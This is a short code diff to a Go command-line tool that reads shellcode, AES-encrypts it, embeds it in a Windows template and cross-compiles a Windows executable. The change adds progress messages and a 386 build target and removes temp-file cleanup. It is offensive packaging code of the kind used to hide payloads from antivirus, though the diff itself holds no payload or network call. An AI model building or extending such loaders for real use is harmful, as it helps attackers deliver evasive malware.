@@ -21,7 +21,7 @@ func GetParser(opts *Options) *cobra.Command {
         Run: func(cmd *cobra.Command, args []string) {
 
             if opts.ShellcodePath == "" {
-                fmt.Println("[!] Please specify your shellcode's path with -s")
+                fmt.Println("[!] Please specify your shellcode's path with --shellcode")
                 os.Exit(1)
             }
 
@@ -30,6 +30,7 @@ func GetParser(opts *Options) *cobra.Command {
                 os.Exit(1)
             }
 
+            fmt.Println("[+] Successfully read shellcode")
             payload := loader.Encrypt(opts.AesKey, plaintext_payload)
             s := loader.Shellcode{
                 Payload: payload,
@@ -37,15 +38,18 @@ func GetParser(opts *Options) *cobra.Command {
                 AesKey: []byte(opts.AesKey),
             }
 
+            fmt.Println("[+] Encrypted shellcode with AES key")
             toCompile := loader.LoadWindowsTemplate(s)
             err  = loader.WriteToTempfile(toCompile); if err != nil {
                 fmt.Printf("Write error: %s\n", err.Error())
                 os.Exit(1)
             }
 
-            os.Setenv("GOOS", "windows")
+            fmt.Println("[+] loaded Windows template")
 
             /* run compilation */
+            os.Setenv("GOOS", "windows")
+            os.Setenv("GOARCH", "386")
             err = exec.Command(
                 "go",
                 "build",
@@ -58,8 +62,7 @@ func GetParser(opts *Options) *cobra.Command {
                 println("[!] Compile error: " + err.Error())
                 return
             }
-
-            os.Remove("tmp.go")
+            fmt.Println("[+] Successfully compiled shellcode")
         },
     }
 
